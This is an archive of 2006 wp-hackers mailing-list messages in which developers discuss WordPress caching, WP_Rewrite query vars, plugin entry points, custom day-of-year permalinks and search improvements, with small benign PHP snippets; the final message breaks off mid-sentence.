References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com><76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>	<006601c6292e$3eca0820$6e01a8c0@sixfour>	<43E41D91.1040301@boren.nu>
	<D170385A-5999-4E76-8F1F-C427A8513CF2@txfx.net>
Message-ID: <43E43E7B.1080402@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Mark Jaquith wrote:

> Lines 407 and 408 are redundant... we don't need to bother checking 
> safe mode if we're already disabling it by default

We should still disable it for people who turn it on even though they are in safe mode, shouldn't we?

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD5D57rovxfShShFARAsrEAJwOMmL877Jsf9W1osyPe3ji4ShOPQCfX3GI
ks3EpUdybQeTFE5plgzbgAI=
=JbL/
-----END PGP SIGNATURE-----
From jarret at netspace.net.au  Sat Feb  4 06:12:18 2006
From: jarret at netspace.net.au (JARRET NETSPC)
Date: Sat Feb  4 06:13:41 2006
Subject: [wp-hackers] multiple blog conundrum
In-Reply-To: <43E43E7B.1080402@jamietalbot.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com><76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>	<006601c6292e$3eca0820$6e01a8c0@sixfour>	<43E41D91.1040301@boren.nu>	<D170385A-5999-4E76-8F1F-C427A8513CF2@txfx.net>
	<43E43E7B.1080402@jamietalbot.com>
Message-ID: <43E445C2.1000306@netspace.net.au>

Hi everyone,

I'm completely new to the list and I'm hoping to find an answer to a 
question I could not resolve via WP support or Codex. Any help would be 
greatly appreciated.

I need to run a number of blogs on separate sub-domains and databases. 
However, the branding (with the exception of the header) will be the 
same for all of them as will be the functionality where plugins etc are 
concerned. I am wondering whether it is possible for the separate blogs 
to reference a central theme and plugins folder so that changes made in 
these folders are automatically propagated through all the blogs?

Thanks in advance,

Jarret
From skeltoac at gmail.com  Sat Feb  4 07:00:36 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat Feb  4 07:02:01 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <43E4312D.2040405@robm.me.uk>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<43E301B7.1000408@boren.nu>
	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>
	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>
	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>
	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
	<43E3E842.7020803@boren.nu>
	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>
	<43E4312D.2040405@robm.me.uk>
Message-ID: <e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>

On 2/3/06, Rob <powzor@gmail.com> wrote:
> but I discovered that the rewrite will only work if you're rewriting to
> index.php

Right. Wp_rewrite is not a replacement for mod_rewrite. It only
rewrites internally. To rewrite to other scripts without mod_rewrite
would require browser redirection. By keeping its scope limited to
index.php, we never have to redirect the browser.

> ...displaying the first post in my blog when you visit /library/. I
> thought then that I could just redirect to "index.php?library=true", and
> then hook into init() to check $_GET['library'] and do what I want if it
> was set, but no dice; it never seems to pass the variable in the query
> string, as var_dump()ing $_GET gives an empty array every time.

First, the init action is earlier than wp(), the function that
eventually calls $wp->parse_request(), the function that checks the
request against the wp_rewrite rules.

Second, wp_rewrite isn't going to recognize your query var unless you
add it to the public_query_vars array. There's a filter for that in
classes.php line 1584: query_vars.

Third, you're not going to find it in $_GET because WP doesn't
populate that with wp_rewrite query vars. Instead they get put in
$wp->query_vars.

Fourth and last, why bother with wp_rewrite when all you need to do is
check the request URI for your pattern and take over if it matches? I
don't know what your plugin is meant to do but I can tell you this: if
your "library" action doesn't need to modify the posts query, you can
forget about wp_rewrite.

Fifth and not even in the list, I disclaim all responsibility for the
forgoing nonsense and any consequences for putting same into practice,
real or imagined. ;-)

Andy
From skeltoac at gmail.com  Sat Feb  4 07:10:43 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat Feb  4 07:12:05 2006
Subject: [wp-hackers] multiple blog conundrum
In-Reply-To: <43E445C2.1000306@netspace.net.au>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>
	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>
	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
	<43E3E842.7020803@boren.nu> <006601c6292e$3eca0820$6e01a8c0@sixfour>
	<43E41D91.1040301@boren.nu>
	<D170385A-5999-4E76-8F1F-C427A8513CF2@txfx.net>
	<43E43E7B.1080402@jamietalbot.com> <43E445C2.1000306@netspace.net.au>
Message-ID: <e6ec604d0602032310g7f4ca329y5612557e3bf0466f@mail.gmail.com>

On 2/4/06, JARRET NETSPC <jarret@netspace.net.au> wrote:
> I need to run a number of blogs on separate sub-domains and databases.
> However, the branding (with the exception of the header) will be the
> same for all of them as will be the functionality where plugins etc are
> concerned. I am wondering whether it is possible for the separate blogs
> to reference a central theme and plugins folder so that changes made in
> these folders are automatically propagated through all the blogs?

Check out WPMU: http://mu.wordpress.org

Other options include plugins, SVN checkouts, symlinks.

Andy
From mark.wordpress at txfx.net  Sat Feb  4 10:01:04 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb  4 10:02:29 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <43E43E7B.1080402@jamietalbot.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com><76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>	<006601c6292e$3eca0820$6e01a8c0@sixfour>	<43E41D91.1040301@boren.nu>
	<D170385A-5999-4E76-8F1F-C427A8513CF2@txfx.net>
	<43E43E7B.1080402@jamietalbot.com>
Message-ID: <52A48383-1C08-45B7-921B-BD65D8CAEB89@txfx.net>

On Feb 4, 2006, at 12:41 AM, Jamie Talbot wrote:

> Mark Jaquith wrote:
>
>> Lines 407 and 408 are redundant... we don't need to bother checking
>> safe mode if we're already disabling it by default
>
> We should still disable it for people who turn it on even though  
> they are in safe mode, shouldn't we?

Absolutely not!  As Ryan has said before, safe mode doesn't mean that  
it won't work... there exist "functional" safe mode setups.

And at any rate, that's now what those lines do.  Those lines disable  
the cache if the user is using safe mode and has not specified  
ENABLE_CACHE ... but we're already disabling the cache if the user  
hasn't specified ENABLE_CACHE, so it's pointless to have those  
lines.  The if() condition will never be true, because the lines  
before it would return before they'd even get executed.

--
Mark Jaquith
http://txfx.net/


From heilemann at gmail.com  Sat Feb  4 13:39:41 2006
From: heilemann at gmail.com (Michael Heilemann)
Date: Sat Feb  4 13:41:05 2006
Subject: [wp-hackers] Wiki Wiki WordPress
Message-ID: <5a715c0a0602040539w63815d20n7e74e8218172a2fc@mail.gmail.com>

Hey,

I've set up a discussion forum for the creation of Wiki tools for
WordPress. If you're interested in participating in the creation of
such, feel free to chime in.

Message Ends.

--
Aloha,
Michael Heilemann
http://binarybonsai.com
From peter.westwood at ftwr.co.uk  Sat Feb  4 13:59:14 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat Feb  4 14:01:16 2006
Subject: [wp-hackers] caching doesn't work?
In-Reply-To: <ebe43d680602020159m132edb29k@mail.gmail.com>
References: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>	<ebe43d680602010816s5f2bc796o@mail.gmail.com>	<39DFEEC8-2700-4C6E-9E15-E53862F1CFB9@stupendous.net>	<0390CF57-3706-49F3-A945-CE3BF15CE647@stupendous.net>
	<ebe43d680602020159m132edb29k@mail.gmail.com>
Message-ID: <43E4B332.3080205@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

David House wrote:
> On 02/02/06, Nathan Ollerenshaw <chrome@stupendous.net> wrote:
>> I thought WP_Object_Cache obviates the need for other caching
>> systems ... but it doesn't seem to make a difference performance-wise
>> whether it is on or off, though looking at what stats() gives you, it
>> seems to be 'working'.
> 
> Try sticking $wp_object_cache->stats() somewhere in your theme to see
> how many hot/cold hits you're getting. (a hot hit is one where the
> object was already cached in memory, a cold one is where it has to be
> loaded from the file system, a miss is where it can't be found even
> there).
> 

I finally finished off the plugin I had been hacking to display this
info in a slightly more accessible way for the admin user.

See: http://blog.ftwr.co.uk/wordpress/wp-cache-inspect/ for more info.

The plugin also exposes an easy to use cache clear button.

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD5LMyVPRdzag0AcURAuaJAKCxCzaUeQep4xYtam+DRnLH4McE2gCfQWVK
kAVYizd6lxD/DZWZqfhrmgQ=
=gtI+
-----END PGP SIGNATURE-----

From powzor at gmail.com  Sat Feb  4 16:36:27 2006
From: powzor at gmail.com (Rob)
Date: Sat Feb  4 16:33:02 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>	<43E4312D.2040405@robm.me.uk>
	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>
Message-ID: <43E4D80B.8010003@robm.me.uk>

Andy Skelton wrote:
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   

I was under the impression that WP_Rewrite was the only way to modify 
the rewrite rules in .htaccess, which I need to do if I want to have 
/library/ instead of 
/wp-content/plugins/my-plugin/my-plugin.php?library=true which is vastly 
more ugly.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From aaron at technosailor.com  Sat Feb  4 17:52:15 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Sat Feb  4 17:53:39 2006
Subject: [wp-hackers] WordPress Importer
Message-ID: <20060204175335.492E160EB@comox.textdrive.com>

Just out of curiosity, has anyone thought about writing a WordPress import script ? useful for combining existing WordPress blogs perhaps from different versions?

From mattias at winthernet.se  Sat Feb  4 18:31:37 2006
From: mattias at winthernet.se (Mattias Winther)
Date: Sat Feb  4 18:33:11 2006
Subject: [wp-hackers] WordPress Importer
In-Reply-To: 20060204175335.492E160EB@comox.textdrive.com
Message-ID: <c1a44a4ab96a037db440cb6c833bff1d@imap.scorpionshops.com>


I was thinking the exact same thing... Preferrably with posts functionality, so that I can come up with a new post on my development blog, which won't exist on my regular blog until I'm finished, and decide to import it!

On Sat, 4 Feb 2006 12:52:15 -0500, "Aaron Brazell" <aaron@technosailor.com> wrote:
> Just out of curiosity, has anyone thought about writing a WordPress import
> script ? useful for combining existing WordPress blogs perhaps from
> different versions?
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ryan at boren.nu  Sat Feb  4 19:55:35 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sat Feb  4 19:57:08 2006
Subject: [wp-hackers] Friendly plugin URL entrypoints?
In-Reply-To: <43E36A13.90102@midnightcircus.com>
References: <43E36A13.90102@midnightcircus.com>
Message-ID: <43E506B7.30602@boren.nu>

Owen Winkler wrote:
> Would it be worthwhile to have a dedicated friendly-style URL entry 
> point for plugins?  For example...
> 
> I have a couple plugins that employ Ajax.  I have a couple that generate 
> javascript based on a request.  It would be useful to have a URL that 
> was an entry point to those features that didn't include three 
> directories of depth of wp organization.
> 
> Instead of requesting:
> http://example.com/wp-content/plugins/myplugin/myplugin.php?entrypoint=1
> 
> I could request something like:
> http://example.com/_plugin/myplugin/1
> 
> And I could generate that URL by calling something like:
> get_plugin_entrypoint('myplugin', 1);
> 
> And just maybe a request of that URL could fire a hook:
> do_action('entrypoint_myplugin', 1);
> 
> Which I would register by calling:
> register_entrypoint('myplugin', 1, 'my_entrypoint_function');
> 
> Yes, I can modify the rewrite rules in my plugin to handle this.  But 
> I'll do it in every plugin I write that uses javascript like this, which 
> would repeat a bunch of code.  If some other developer does it, we'll be 
> cluttering the site's URL landscape with plugin entrypoints, and it 
> might be nice to put them all in one place.  Something like this could 
> make it much easier to implement Ajax (and other javascript techniques) 
> via plugin to provide a more rich user experience.
> 
> Does this seem worthwhile?  Does it seem doable?
> 
> I've been writing a couple of new things that use a few complicated 
> javascript techniques, and it occurs to me that this is simply not poetry:
> 
> class AjaxPlugin {
>     function AjaxPlugin () {
>         if(defined('ABSPATH')) {
>             add_action('wp_header',
>             array(&$this, 'wp_header'));
>         }
>     }
>     function solo() {
>         // Do things when the plugin file is loaded by
>         // itself but that also require WP functions/data
>     }
>     function include_up() {
>         // This function finds a file in
>         // progressive parent directories
>         return $file_location;
>     }
>     function wp_header() {
>         // Create a reference to this file in a script tag
>         echo '<script type="text/javascript" src="'
>         . $this->pluginuri . '"></script>';
>     }
>     function pluginuri() {
>         // Return the URI of this file in the plugins dir
>         return get_settings('siteurl')
>         . '/wp-content/plugins/'
>         . plugin_basename(__FILE__);
>     }
> }
> $ajaxplugin = new AjaxPlugin();
> if(!defined('ABSPATH')) {
>     // Must include wp-config.php at the global scope.
>     include($ajaxplugin->include_up('wp-config.php');
>     $ajaxplugin->solo();
> }
> 
> 
> Suggestions for prettier alternatives are welcome.

I don't worry with pretty URIs, but here's what I do to set an entry 
point.  It takes advantage of get_plugin_page_hookname() behavior to 
create one entrypoint that is triggered when admin.php?page=mypluginpage 
loads.  I usually have that entry point act as a dispatcher for the plugin.

function get_plugin_page_link($file) {
	$name = plugin_basename($file);
	$args = array('page' => $name, 'noheader' => 1);
	return add_query_arg($args, get_settings('siteurl') . 
"/wp-admin/admin.php");
}

function myplugin_get_plugin_page_link() {
	return get_plugin_page_link(__FILE__);
}

function register_plugin_page_hook($file, $hook) {
	$hookname = plugin_basename($file);
	$hookname = preg_replace('!\.php!', '', $hookname);
	// get_plugin_page_hookname() in admin-functions.php creates
	// a _page_ hook if the requested plugin page is not registered
	// as a menu handler.  admin.php will do_action on this hook.
	$hookname = '_page_' . $hookname;
	add_action($hookname, $hook);
}

function myplugin_register_plugin_page_hook() {
	register_plugin_page_hook(__FILE__, 'myplugin_plugin_page_handler');
}
From skeltoac at gmail.com  Sat Feb  4 22:39:59 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat Feb  4 22:41:22 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <43E4D80B.8010003@robm.me.uk>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>
	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>
	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>
	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
	<43E3E842.7020803@boren.nu>
	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>
	<43E4312D.2040405@robm.me.uk>
	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>
	<43E4D80B.8010003@robm.me.uk>
Message-ID: <e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>

On 2/4/06, Rob <powzor@gmail.com> wrote:
> I was under the impression that WP_Rewrite was the only way to modify
> the rewrite rules in .htaccess, which I need to do if I want to have
> /library/ instead of
> /wp-content/plugins/my-plugin/my-plugin.php?library=true which is vastly
> more ugly.

There are a few different ways to inject rules into .htaccess only,
skipping wp_rewrite->rules. If you know your code only needs to work
on Apache with mod_rewrite, no problem. However for portability you
must use wp_rewrite instead.

When I say wp_rewrite I'm referring to the rewriting engine built into
the WP_Rewrite and WP classes. It works whether or not mod_rewrite is
available.

The function $wp->parse_request() does the work of finding the rule
that matches the request. It never populates any member of the $_GET
array. Instead it populates the array $wp->query_vars.

It doesn't just grab every query var from the rewritten query
willy-nilly. It only sets those vars named in $wp->public_query_vars.
If you want to add a varname to the list, use the 'query_vars' filter.

function nr_query_vars($array) {
 $array[]='library';
 return $array;
}
add_filter('query_vars', 'nr_query_vars');

Andy
From skippy at skippy.net  Sat Feb  4 23:21:03 2006
From: skippy at skippy.net (Scott Merrill)
Date: Sat Feb  4 23:22:28 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>	<43E4312D.2040405@robm.me.uk>	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>	<43E4D80B.8010003@robm.me.uk>
	<e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>
Message-ID: <43E536DF.90303@skippy.net>

Andy Skelton wrote:
> The function $wp->parse_request() does the work of finding the rule
> that matches the request. It never populates any member of the $_GET
> array. Instead it populates the array $wp->query_vars.
> 
> It doesn't just grab every query var from the rewritten query
> willy-nilly. It only sets those vars named in $wp->public_query_vars.
> If you want to add a varname to the list, use the 'query_vars' filter.
> 
> function nr_query_vars($array) {
>  $array[]='library';
>  return $array;
> }
> add_filter('query_vars', 'nr_query_vars');

I'm late to this discussion, because I've just realized that I'd like to
use a custom permalink structure for a project.  Specifically, I want to
use semi-Julian dates (date('z') in PHP).  I see how to insert the
query_var, and the regex is easy enough (/\d{3}/)m but I don't see how
to get in to manipulate WordPress' date variables.

I'm not asking for anyone to write my code for me, but a more thorough
example than the ones presented so far would go a long way to help
unmuddle the water for me.

Thanks!
Scott

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From skeltoac at gmail.com  Sat Feb  4 23:27:30 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat Feb  4 23:28:54 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <43E536DF.90303@skippy.net>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>
	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
	<43E3E842.7020803@boren.nu>
	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>
	<43E4312D.2040405@robm.me.uk>
	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>
	<43E4D80B.8010003@robm.me.uk>
	<e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>
	<43E536DF.90303@skippy.net>
Message-ID: <e6ec604d0602041527h1b69d278p645412f9a9594a7a@mail.gmail.com>

On 2/4/06, Scott Merrill <skippy@skippy.net> wrote:
> I'm late to this discussion, because I've just realized that I'd like to
> use a custom permalink structure for a project.  Specifically, I want to
> use semi-Julian dates (date('z') in PHP).  I see how to insert the
> query_var, and the regex is easy enough (/\d{3}/)m but I don't see how
> to get in to manipulate WordPress' date variables.

Once you've gotten your query var into $wp->query_vars, you can filter
'query_string' (classes.php line 1662). This is only one way to do it
but it's the first one I thought of. Take your date out of the query
string and replace it with the WP-recognized one.

Buy me a beer,
Andy :-)
From skippy at skippy.net  Sun Feb  5 02:33:32 2006
From: skippy at skippy.net (Scott Merrill)
Date: Sun Feb  5 02:34:58 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <e6ec604d0602041527h1b69d278p645412f9a9594a7a@mail.gmail.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>	<43E4312D.2040405@robm.me.uk>	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>	<43E4D80B.8010003@robm.me.uk>	<e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>	<43E536DF.90303@skippy.net>
	<e6ec604d0602041527h1b69d278p645412f9a9594a7a@mail.gmail.com>
Message-ID: <43E563FC.8050306@skippy.net>

Andy Skelton wrote:
> On 2/4/06, Scott Merrill <skippy@skippy.net> wrote:
> 
>>I'm late to this discussion, because I've just realized that I'd like to
>>use a custom permalink structure for a project.  Specifically, I want to
>>use semi-Julian dates (date('z') in PHP).  I see how to insert the
>>query_var, and the regex is easy enough (/\d{3}/)m but I don't see how
>>to get in to manipulate WordPress' date variables.
> 
> 
> Once you've gotten your query var into $wp->query_vars, you can filter
> 'query_string' (classes.php line 1662). This is only one way to do it
> but it's the first one I thought of. Take your date out of the query
> string and replace it with the WP-recognized one.
> 
> Buy me a beer,

Hold on there cowboy!  ;)  I'll be happy to buy you a beer, but...

I'm missing something.  I want a new permalink structure to be applied
to posts.  Instead of /%year%/%monthnum%/%day%/, I want to use
/%year%/%doy%/ where "doy" is Day of Year (date('z')).  Calculating the
DoY is easy, but I don't know where to do it in order to make
get_permalink() use it.

Reversing the DoY into month+day is also (I think) fairly easy, but I'm
having trouble seeing where I'd slip it into the flow.

The examples I'm seeing all seem to assume some /tag/ prefix after which
will live the "stuff" for the permalink or query_var; but I don't want
/2006/doy/001 for January 2; I want plain ol' /2006/001.  So I'm having
trouble modifying the examples for my needs.

I tried modifying Ryan's "Query Redirect Rewrite" plugin, but I could
never seem to get my query_var added to the list.

So, short of asking for someone to write my code for me, I would really
like to see a comprehensive example of how to add and use a new
permalink token -- assuming such can be done.

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From sam at rephrase.net  Sun Feb  5 03:46:05 2006
From: sam at rephrase.net (Sam Angove)
Date: Sun Feb  5 03:47:31 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <43E563FC.8050306@skippy.net>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<43E3E842.7020803@boren.nu>
	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>
	<43E4312D.2040405@robm.me.uk>
	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>
	<43E4D80B.8010003@robm.me.uk>
	<e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>
	<43E536DF.90303@skippy.net>
	<e6ec604d0602041527h1b69d278p645412f9a9594a7a@mail.gmail.com>
	<43E563FC.8050306@skippy.net>
Message-ID: <aa74b1910602041946k5d1ed9d1j460958fbe591110f@mail.gmail.com>

On 2/5/06, Scott Merrill <skippy@skippy.net> wrote:
>
> So, short of asking for someone to write my code for me, I would really
> like to see a comprehensive example of how to add and use a new
> permalink token -- assuming such can be done.

Try this:
   http://rephrase.net/miscellany/06/dayofyear.phps

It isn't a comprehensive example, but it does part of what you want.
There might be a better place to add the rewrite tag, but that hook
works. Just use %dayofyear% in the permalink structure in the admin
panel.
From r at schestowitz.com  Sun Feb  5 05:11:23 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Sun Feb  5 05:11:00 2006
Subject: [wp-hackers] Dashboard Accesskeys
Message-ID: <20060205051123.mh1v2bq5u5u00ggs@banana.catalyst2.com>

While I'm aware of the many problems with accesskeys, they are already used
(some would say controversially) in the TinyMCE component. I believe that
one aspect which the dashboard evades is keyboard navigation. The AJAX bits
makes matters even worse, e.g. tabbing.

If accesskeys have already been embraced, why not underline letters and
assign accelerators to top menus (and sub-menus) on the fly, depending on
the platform and browser used? This functionality can be disabled when
editing in WYSIWYG mode. Think of editing comments by simply hitting
CTRL+M, CTRL+C. It doesn't/shouldn't lead to any user confusion.
From skeltoac at gmail.com  Sun Feb  5 05:56:12 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sun Feb  5 05:57:37 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <aa74b1910602041946k5d1ed9d1j460958fbe591110f@mail.gmail.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>
	<43E4312D.2040405@robm.me.uk>
	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>
	<43E4D80B.8010003@robm.me.uk>
	<e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>
	<43E536DF.90303@skippy.net>
	<e6ec604d0602041527h1b69d278p645412f9a9594a7a@mail.gmail.com>
	<43E563FC.8050306@skippy.net>
	<aa74b1910602041946k5d1ed9d1j460958fbe591110f@mail.gmail.com>
Message-ID: <e6ec604d0602042156kc3251f4r8c8143a26dd2fbae@mail.gmail.com>

On 2/4/06, Sam Angove <sam@rephrase.net> wrote:
> On 2/5/06, Scott Merrill <skippy@skippy.net> wrote:
> >
> > So, short of asking for someone to write my code for me, I would really
> > like to see a comprehensive example of how to add and use a new
> > permalink token -- assuming such can be done.
>
> Try this:
>    http://rephrase.net/miscellany/06/dayofyear.phps

That's quite good. filter_query_string will have to be modified to
also grab the year so you can deal with leap years.

Andy
From fuzzygroup at gmail.com  Sun Feb  5 09:28:11 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Sun Feb  5 09:29:37 2006
Subject: [wp-hackers] Development for 2.x : Improved Search
Message-ID: <8e1656660602050128g69f3860ci9e6b7e02477f00f8@mail.gmail.com>

Hello,

[Thanks to Andy for previewing this before I sent it to the list as a whole]

Now I'm a search geek and I find that WordPress' search functionality just
doesn't cut it.  And I think this is fixable in one of 2 ways -- actually
there are likely Big N ways to fix it but 2 ways I'd be interested in taking
on.

Note: I know that at least one high profile WP User (Om Malik who is
Business 2.0 / Gigaom.com <http://gigaom.com/>) really wants search
"fixed".  And search my blog, fuzzyblog.com for the term money versus google
or blogdigger and its clearly not doing enough.

a) Simple : Add MySQL Full Text Indexing to Wordpress and modify the search
hooks to use it. Moving to FT indices on MyISAM tables gives actually quite
good serch out of the gate.  its not perfect but it scales to like
1.3million posts w/ relatively linear response times.  Its public
knowledge
that the 1st version of Feedster did MySQL full text until we hit this
point.  its not perfect and there are some character set issues but its a
lot better than what seems to be in place now.

Difficulty: not huge.  Willing to do in full myself.

b) if the desire for N database support means that WP doesn't want to do
this then the next approach is to duplicate the SQL based search approach of
MnogoSearch which uses SQL tables for the core word list and indices.  Its
an interesting approach and would take a bunch of work but I could certainly
do help w/ that but its a long term not short term project and would take
more than just me.

Difficulty: tedious and a fair bit of code.

c) I don't know what hosted WP does for tables but the big limitation on
MyISAM is scalabilty when you generally move to Innodb.  Now innodb, of
course, doesn't have full text indices which raises another set of issues.
Also there are implications on all this if you're using 1 table for 1 users
posts versus 1 table for ALL users posts.  Any insights would be appreciated
(I'm a search guy who's learning to hack WP but knows damn well he doesn't
have all the answers).

d) UI and posts versus pages.  My suggestion is to generate a composite
results page showing something like this imho:

Matching blog posts for FOO:

Sorted by date | [Sort by Relevance]  <== links

1. Blah Bar
2. Blah Foo
3. Blah Gah
4.  blah Etc

More...

Matching pages for FOO:

(same structure)

Thoughts?  *ducks*

Scott
From apakuni at gmail.com  Sun Feb  5 09:30:20 2006
From: apakuni at gmail.com (Douglas Daulton)
Date: Sun Feb  5 09:31:45 2006
Subject: [wp-hackers] WordPress Importer (Cross-Post)
In-Reply-To: <c1a44a4ab96a037db440cb6c833bff1d@imap.scorpionshops.com>
Message-ID: <C00B05AC.F16C%apakuni@gmail.com>

Along the same lines, it would be cool if there were a "cross-post" function
which would allow you to set up one or more additional blogs in the Admin
section.  Then, each of these blogs would appear in a drop down on the post
page.  Select the other blogs you want to send that post to as well and it
